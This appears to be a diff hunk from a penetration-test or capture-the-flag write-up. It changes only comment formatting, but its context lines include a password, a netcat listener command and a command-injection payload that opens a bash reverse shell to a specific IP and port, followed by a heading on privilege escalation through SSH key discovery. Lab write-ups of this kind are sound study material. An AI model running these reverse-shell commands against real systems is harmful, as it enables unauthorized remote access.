@@ -40,10 +40,10 @@ Password: cn7824
 Reverse Shell Establishment:
 
 bash
-# Attacker listener
+Attacker listener
 nc -nvlp 1234
 
-# Command injection payload
+Command injection payload
 bash -c 'exec bash -i &>/dev/tcp/10.201.44.153/1234 <&1'
 3. Privilege Escalation Path
 SSH Key Discovery:
